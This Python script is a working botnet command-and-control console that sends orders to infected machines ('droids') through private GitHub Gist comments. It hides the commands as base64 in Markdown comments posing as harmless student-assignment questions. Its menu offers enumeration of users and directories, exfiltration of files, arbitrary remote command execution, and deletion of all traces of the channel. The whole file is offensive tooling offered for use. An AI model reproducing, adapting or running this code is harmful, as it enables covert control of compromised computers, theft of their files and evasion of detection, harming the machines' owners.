#!/usr/bin/python3
import sys
import requests
import json
import time
import subprocess
import base64
from datetime import datetime


class Git:

    def __init__(self, github_gist_api, api_token):
        self.GITHUB_GIST_API = github_gist_api
        self.API_TOKEN = api_token
        self.log_file = "log"
        self.gist_id = ""

    def create_gist(self, gist_name):
        headers = {'Authorization': 'token %s' % self.API_TOKEN}
        params = {'scope': 'gist'}
        payload = {"description": "This gist was created for stage 5 of student assignments.",
                   "public": False,
                   "files": {self.log_file: {"content": "{}"}, gist_name: {"content": "Hello students!"}}}

        res = requests.post(self.GITHUB_GIST_API, headers=headers, params=params, data=json.dumps(payload))
        if res.status_code != 201:
            print("Unable to create gist. Statu code " + str(res.status_code))
            print(res.text)
            exit(2)

        self.gist_id = json.loads(res.text)['id']

    def get_number_of_droids(self):
        headers = {'Authorization': 'token %s' % self.API_TOKEN}
        params = {'Accept': 'application/vnd.github+json'}
        url = self.GITHUB_GIST_API + "/" + self.gist_id
        timestamp_now = datetime.utcnow()
        date_format = "%Y-%m-%dT%H:%M:%SZ"
        res = requests.get(url, headers=headers, params=params)

        if res.status_code != 200:
            print("Unable to get all gists. Statu code " + str(res.status_code))
            print(res.text)
            return 0

        files = json.loads(res.text)['files']
        logs = json.loads(files["log"]["content"])
        count = 0
        for i in logs.keys():
            last_active = datetime.strptime(logs[i]["last_activity"], date_format)
            if (timestamp_now - last_active).total_seconds() <= 15:
                count += 1

        return count

    def get_and_set_gist_id(self, gist_name):
        headers = {'Authorization': 'token %s' % self.API_TOKEN}
        params = {'Accept': 'application/vnd.github+json'}

        res = requests.get(self.GITHUB_GIST_API, headers=headers, params=params)

        if res.status_code != 200:
            print("Unable to get all gists. Statu code " + str(res.status_code))
            print(res.text)

        last_updated = ""
        for gist in json.loads(res.text):
            if gist_name in gist['files'].keys():
                if last_updated == "" or gist['updated_at'] > last_updated:
                    last_updated = gist['updated_at']
                    self.gist_id = gist['id']
        if self.gist_id == "":
            print("Unable to find gist " + gist_name + ".")
            exit(2)
        print("Using gist with id: " + self.gist_id)

    def add_comment_to_gist(self, content):
        headers = {'Authorization': 'token %s' % self.API_TOKEN}
        payload = {"body": content}
        url = self.GITHUB_GIST_API + "/" + self.gist_id + "/comments"

        res = requests.post(url, headers=headers, data=json.dumps(payload))
        if res.status_code != 201:
            print("Unable to add comment to gist. Statu code " + str(res.status_code))
            print(res.text)

    def get_gist_comments(self):
        headers = {'Authorization': 'token %s' % self.API_TOKEN}
        params = {'Accept': 'application/vnd.github+json'}
        url = self.GITHUB_GIST_API + "/" + self.gist_id + "/comments"

        res = requests.get(url, headers=headers, params=params)
        if res.status_code != 200:
            print("Unable to get gist's comments " + self.gist_id + ". Statu code " + str(res.status_code))
            print(res.text)

        return json.loads(res.text)

    def remove_gist(self):
        headers = {'Authorization': 'token %s' % self.API_TOKEN}
        params = {'Accept': 'application/vnd.github+json'}
        url = self.GITHUB_GIST_API + "/" + self.gist_id

        res = requests.delete(url, headers=headers, params=params)
        if res.status_code != 204:
            print("Unable to remove gist " + self.gist_id + ". Statu code " + str(res.status_code))
            print(res.text)


def wait_for_reasonable_time():
    time.sleep(10)


def execute_command(command):
    process = subprocess.Popen(command.split(), stdout=subprocess.PIPE)
    return process.communicate()


def request_logged_in_users(git, number):
    comment_text = "# Assignment " + str(number) + "\nStudents, what users do you see on your lab computers?"
    git.add_comment_to_gist(comment_text)
    print("Gathering information...")
    wait_for_reasonable_time()
    related_comments = []
    for comment in git.get_gist_comments():
        if comment['body'].startswith("> # Assignment " + str(number)):
            related_comments.append(comment['body'])

    for comment in related_comments:
        lines = comment.splitlines()
        ip = bytes.fromhex(lines[2].split()[3]).decode("utf-8")
        print("Droid with ip " + str(ip) + " is used by:")
        for i in range(4, len(lines)):
            print(lines[i])


def request_content_of_directory(git, number):
    path = input("Which directory?\n")
    path_base = base64.b64encode(path.encode("utf-8")).decode("utf-8")
    print("Ordering the droids now.")
    comment_text = "# Assignment " + str(
        number) + "\nStudents, what is the content of your home directory?\n\n[//]: <> ( " \
                   + path_base + " )"
    git.add_comment_to_gist(comment_text)
    wait_for_reasonable_time()
    related_comments = []
    for comment in git.get_gist_comments():
        if comment['body'].startswith("> # Assignment " + str(number)):
            related_comments.append(comment['body'])

    for comment in related_comments:
        lines = comment.splitlines()
        ip = bytes.fromhex(lines[2].split()[3]).decode("utf-8")
        print("Droid with ip " + str(ip) + " found content of directory `" + path + "`:")
        print(base64.b64decode(lines[5].split()[3]).decode("utf-8"))


def request_user(git, number):
    print("What a great choice, my lord.")
    comment_text = "# Assignment " + str(number) + "\nStudents, what is the answer to the text in file `flag.txt`?"
    git.add_comment_to_gist(comment_text)
    wait_for_reasonable_time()
    related_comments = []
    for comment in git.get_gist_comments():
        if comment['body'].startswith("> # Assignment " + str(number)):
            related_comments.append(comment['body'])

    for comment in related_comments:
        lines = comment.splitlines()
        ip = bytes.fromhex(lines[2].split()[3]).decode("utf-8")
        print("Droid with ip " + str(ip) + " have username: " + str(
            base64.b64decode(lines[5].split()[3]).decode("utf-8")))


def request_file(git, number):
    path = input("What file would you like?\n")
    path_base = base64.b64encode(path.encode("utf-8")).decode("utf-8")
    comment_text = "# Assignment " + str(
        number) + "\nStudents, find and write here the hidden flag on the computer?\n\n[//]: <> ( " \
                   + path_base + " )"
    git.add_comment_to_gist(comment_text)
    print("Downloading from droids...")
    wait_for_reasonable_time()
    related_comments = []
    for comment in git.get_gist_comments():
        if comment['body'].startswith("> # Assignment " + str(number)):
            related_comments.append(comment['body'])

    for comment in related_comments:
        lines = comment.splitlines()
        ip = bytes.fromhex(lines[2].split()[3]).decode("utf-8")
        file_content = base64.b64decode(lines[5].split()[3]).decode("utf-8")
        file_name = path.split("/")
        file_name = str(file_name[len(file_name) - 1])
        file_name = str(ip) + "_" + file_name
        try:
            execute_command("echo " + file_content + " > " + file_name)
        except:
            return
        print("Droid with ip " + str(ip) + " downloaded file to: " + file_name)


def request_command_execution(git, number):
    command = input("What should I order the droids? (to attack?)\n")
    command_base = base64.b64encode(command.encode("utf-8")).decode("utf-8")
    comment_text = "# Assignment " + str(number) + \
                   "\nStudents, there has been a breach to your computer. " \
                   "Find where from it is coming from. (url)\n\n[//]: <> ( " \
                   + command_base + " )"
    git.add_comment_to_gist(comment_text)
    print("Sending command to droids...")
    wait_for_reasonable_time()
    related_comments = []
    for comment in git.get_gist_comments():
        if comment['body'].startswith("> # Assignment " + str(number)):
            related_comments.append(comment['body'])

    for comment in related_comments:
        lines = comment.splitlines()
        ip = bytes.fromhex(lines[2].split()[3]).decode("utf-8")
        print("Droid with ip " + str(ip) + " is executing command.")


if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("Program requires arguments:\nGITHUB_API_TOKEN GIST_NAME")
        exit(1)

    assignment_number = 0

    github_gist_api = "https://api.github.com/gists"
    api_token = sys.argv[1]
    gist_name = sys.argv[2]
    git_instance = Git(github_gist_api, api_token)
    git_instance.create_gist(gist_name)

    run = True
    art = "     ____________________________\n    !\_________________________/!\\\n    !!                         !! \\\n    !!  What a lovely day      !!  \\\n    !!  to use our loyal       !!  !\n    !!  droids, my lord.       !!  !\n    !!                         !!  !\n    !!                         !!  !\n    !!                         !!  !\n    !!                         !!  /\n    !!_________________________!! /\n    !/_________________________\!/\n       __\_________________/__/!\n      !_______________________!/\n    ________________________\n   /oooo  oooo  oooo  oooo /!\n  /ooooooooooooooooooooooo/ /\n /ooooooooooooooooooooooo/ /\n/C=_____________________/_/\n"
    question = "What do you want me to order the droids, my lord?\n"
    options = "0 - Count droids again\n" \
              "1 - Get users logged in to the droids\n" \
              "2 - Get list of directory content on droids\n" \
              "3 - Get droids username\n" \
              "4 - Copy file from droid\n" \
              "5 - Execute any command\n" \
              "6 - Quit and remove all traces of communication\n"
    wrong_option_text = "I am so sorry to disagree with your order, my lord. " \
                        "But your answer must be a number from 0 to 6."
    print(art)
    print("Counting droids...")
    wait_for_reasonable_time()
    while run:
        number_of_droids_message = "\nWe have " + str(git_instance.get_number_of_droids()) + \
                                   " droids to our disposal.\n"
        try:
            selected_option = int(input(number_of_droids_message + question + options))
        except:
            print(wrong_option_text)
            continue
        if selected_option == 1:
            assignment_number += 1
            print("Excellent choice, my lord.")
            request_logged_in_users(git_instance, assignment_number)
        elif selected_option == 2:
            assignment_number += 1
            request_content_of_directory(git_instance, assignment_number)
        elif selected_option == 3:
            assignment_number += 1
            request_user(git_instance, assignment_number)
        elif selected_option == 4:
            assignment_number += 1
            request_file(git_instance, assignment_number)
        elif selected_option == 5:
            assignment_number += 1
            request_command_execution(git_instance, assignment_number)
        elif selected_option == 6:
            run = False
            git_instance.remove_gist()
        elif selected_option == 0:
            continue
        else:
            print(wrong_option_text)
            continue
        question = "What do you want me to order the droids next, my lord?\n"
